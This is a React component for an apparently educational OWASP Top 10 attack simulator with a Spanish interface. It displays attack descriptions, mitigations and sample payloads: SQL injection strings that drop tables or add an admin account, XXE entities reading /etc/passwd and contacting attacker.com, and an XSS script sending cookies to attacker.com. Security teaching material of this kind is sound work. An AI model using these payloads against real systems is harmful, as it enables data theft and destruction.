import React, { useState } from 'react';
import { 
  Database, 
  User, 
  Shield, 
  Lock, 
  Eye, 
  AlertTriangle, 
  Bug, 
  Zap, 
  Globe, 
  FileText,
  Settings,
  Network
} from 'lucide-react';

const OWASPAttacks = ({ onAttackSelect, selectedAttack }) => {
  const owaspAttacks = [
    {
      id: 'injection',
      name: 'Inyección SQL',
      description: 'Inyección de código SQL malicioso en consultas de base de datos',
      icon: Database,
      color: 'red',
      impact: 'Crítico',
      probability: 'Alta',
      method: 'SQL Injection',
      payload: "'; DROP TABLE users; --",
      port: 3306,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Prepared Statements, Validación de entrada',
      examples: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO admin VALUES ('hacker', 'password'); --"
      ]
    },
    {
      id: 'broken-auth',
      name: 'Autenticación Rota',
      description: 'Vulnerabilidades en sistemas de autenticación y gestión de sesiones',
      icon: User,
      color: 'orange',
      impact: 'Alto',
      probability: 'Media',
      method: 'Session Hijacking',
      payload: 'admin=true',
      port: 443,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'MFA, Timeout de sesión, Tokens seguros',
      examples: [
        'Cookie: sessionid=admin123',
        'Authorization: Bearer expired_token',
        'X-API-Key: 123456789'
      ]
    },
    {
      id: 'sensitive-data',
      name: 'Exposición de Datos Sensibles',
      description: 'Exposición accidental de información confidencial',
      icon: Eye,
      color: 'yellow',
      impact: 'Alto',
      probability: 'Media',
      method: 'Data Leakage',
      payload: 'password=123456',
      port: 80,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Encriptación, Mascarado de datos, HTTPS',
      examples: [
        'GET /api/users/1 HTTP/1.1',
        'Content-Type: application/json',
        '{"password": "123456", "ssn": "123-45-6789"}'
      ]
    },
    {
      id: 'xxe',
      name: 'XML External Entities (XXE)',
      description: 'Procesamiento inseguro de archivos XML que permite acceso a archivos del sistema',
      icon: FileText,
      color: 'purple',
      impact: 'Alto',
      probability: 'Baja',
      method: 'XXE Injection',
      payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      port: 8080,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Deshabilitar DTDs, Validación XML, Sanitización',
      examples: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>'
      ]
    },
    {
      id: 'broken-access',
      name: 'Control de Acceso Roto',
      description: 'Restricciones de acceso inadecuadas que permiten acceso no autorizado',
      icon: Lock,
      color: 'blue',
      impact: 'Alto',
      probability: 'Alta',
      method: 'Privilege Escalation',
      payload: 'admin=true',
      port: 443,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'RBAC, Validación de permisos, Auditoría',
      examples: [
        'GET /api/admin/users HTTP/1.1',
        'X-User-Role: admin',
        'Authorization: Bearer user_token'
      ]
    },
    {
      id: 'security-misconfig',
      name: 'Configuración Incorrecta de Seguridad',
      description: 'Configuraciones de seguridad incorrectas o por defecto',
      icon: Settings,
      color: 'gray',
      impact: 'Alto',
      probability: 'Alta',
      method: 'Configuration Bypass',
      payload: 'admin/admin',
      port: 22,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Hardening, Auditoría de configuración, Automatización',
      examples: [
        'ssh admin@10.0.0.50',
        'curl http://10.0.0.50/admin',
        'wget http://10.0.0.50/.env'
      ]
    },
    {
      id: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      description: 'Inyección de scripts maliciosos en aplicaciones web',
      icon: Bug,
      color: 'green',
      impact: 'Medio',
      probability: 'Alta',
      method: 'XSS Injection',
      payload: '<script>alert("XSS")</script>',
      port: 80,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Sanitización, CSP, Validación de entrada',
      examples: [
        '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")'
      ]
    },
    {
      id: 'insecure-deserialization',
      name: 'Deserialización Insegura',
      description: 'Procesamiento inseguro de datos serializados que puede llevar a RCE',
      icon: Zap,
      color: 'pink',
      impact: 'Crítico',
      probability: 'Baja',
      method: 'Deserialization Attack',
      payload: 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',
      port: 8080,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Validación de datos, Deserialización segura, Sandboxing',
      examples: [
        'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',
        '{"__type":"System.IO.FileInfo","FileName":"test.txt"}',
        '<?xml version="1.0"?><object type="System.IO.FileInfo">'
      ]
    },
    {
      id: 'known-vulns',
      name: 'Componentes con Vulnerabilidades Conocidas',
      description: 'Uso de librerías y componentes con vulnerabilidades conocidas',
      icon: AlertTriangle,
      color: 'red',
      impact: 'Alto',
      probability: 'Media',
      method: 'Known Vulnerability Exploit',
      payload: 'CVE-2021-44228',
      port: 8080,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Actualizaciones, Inventario de componentes, Monitoreo',
      examples: [
        'CVE-2021-44228 (Log4j)',
        'CVE-2021-34527 (PrintNightmare)',
        'CVE-2021-26855 (Exchange)'
      ]
    },
    {
      id: 'insufficient-logging',
      name: 'Registro y Monitoreo Insuficientes',
      description: 'Falta de logging y monitoreo que impide detectar ataques',
      icon: Network,
      color: 'indigo',
      impact: 'Medio',
      probability: 'Alta',
      method: 'Stealth Attack',
      payload: 'Silent exploitation',
      port: 443,
      targetIP: '10.0.0.50',
      attackerIP: '192.168.1.100',
      mitigation: 'Logging completo, SIEM, Alertas en tiempo real',
      examples: [
        'No logging de intentos de login fallidos',
        'Falta de monitoreo de accesos anómalos',
        'Sin alertas de cambios de configuración'
      ]
    }
  ];

  const getColorClasses = (color) => {
    const colors = {
      red: 'bg-red-900/30 border-red-400 text-red-200',
      orange: 'bg-orange-900/30 border-orange-400 text-orange-200',
      yellow: 'bg-yellow-900/30 border-yellow-400 text-yellow-200',
      purple: 'bg-purple-900/30 border-purple-400 text-purple-200',
      blue: 'bg-blue-900/30 border-blue-400 text-blue-200',
      gray: 'bg-gray-900/30 border-gray-400 text-gray-200',
      green: 'bg-green-900/30 border-green-400 text-green-200',
      pink: 'bg-pink-900/30 border-pink-400 text-pink-200',
      indigo: 'bg-indigo-900/30 border-indigo-400 text-indigo-200'
    };
    return colors[color] || colors.gray;
  };

  const getImpactColor = (impact) => {
    const colors = {
      'Crítico': 'text-red-400',
      'Alto': 'text-orange-400',
      'Medio': 'text-yellow-400',
      'Bajo': 'text-green-400'
    };
    return colors[impact] || colors['Medio'];
  };

  return (
    <div className="space-y-6">
      <div className="text-center">
        <h3 className="text-2xl font-bold text-white mb-2">
          🎯 OWASP Top 10 - Simulador de Ataques
        </h3>
        <p className="text-gray-300">
          Selecciona un tipo de ataque basado en las vulnerabilidades más críticas
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {owaspAttacks.map((attack) => {
          const Icon = attack.icon;
          const isSelected = selectedAttack === attack.id;
          
          return (
            <div
              key={attack.id}
              onClick={() => onAttackSelect(attack.id)}
              className={`p-4 rounded-lg border-2 cursor-pointer transition-all duration-200 hover:scale-105 ${
                isSelected 
                  ? `${getColorClasses(attack.color)} ring-2 ring-white` 
                  : `${getColorClasses(attack.color)} hover:ring-1 hover:ring-white`
              }`}
            >
              <div className="flex items-start gap-3">
                <div className="flex-shrink-0">
                  <Icon className="w-6 h-6" />
                </div>
                <div className="flex-1 min-w-0">
                  <h4 className="font-semibold text-sm mb-1">
                    {attack.name}
                  </h4>
                  <p className="text-xs text-gray-300 mb-2 line-clamp-2">
                    {attack.description}
                  </p>
                  <div className="flex items-center gap-2 text-xs">
                    <span className={`font-semibold ${getImpactColor(attack.impact)}`}>
                      {attack.impact}
                    </span>
                    <span className="text-gray-400">•</span>
                    <span className="text-gray-400">
                      Prob: {attack.probability}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Información detallada del ataque seleccionado */}
      {selectedAttack && (
        <div className="mt-6 p-6 bg-gray-800 rounded-lg border border-gray-600">
          {(() => {
            const attack = owaspAttacks.find(a => a.id === selectedAttack);
            if (!attack) return null;
            
            const Icon = attack.icon;
            
            return (
              <div className="space-y-4">
                <div className="flex items-center gap-3">
                  <Icon className="w-8 h-8" />
                  <div>
                    <h4 className="text-xl font-bold text-white">
                      {attack.name}
                    </h4>
                    <p className="text-gray-300">
                      {attack.description}
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-3">
                    <h5 className="font-semibold text-white">Detalles del Ataque</h5>
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between">
                        <span className="text-gray-300">Método:</span>
                        <span className="text-white font-mono">{attack.method}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-300">Puerto:</span>
                        <span className="text-white font-mono">{attack.port}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-300">IP Objetivo:</span>
                        <span className="text-white font-mono">{attack.targetIP}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-300">IP Atacante:</span>
                        <span className="text-white font-mono">{attack.attackerIP}</span>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <h5 className="font-semibold text-white">Mitigación</h5>
                    <p className="text-sm text-gray-300">
                      {attack.mitigation}
                    </p>
                  </div>
                </div>

                <div className="space-y-3">
                  <h5 className="font-semibold text-white">Ejemplos de Payload</h5>
                  <div className="space-y-2">
                    {attack.examples.map((example, index) => (
                      <div
                        key={index}
                        className="p-2 bg-gray-900 rounded border border-gray-700"
                      >
                        <code className="text-xs text-green-400 font-mono">
                          {example}
                        </code>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            );
          })()}
        </div>
      )}
    </div>
  );
};

export default OWASPAttacks;
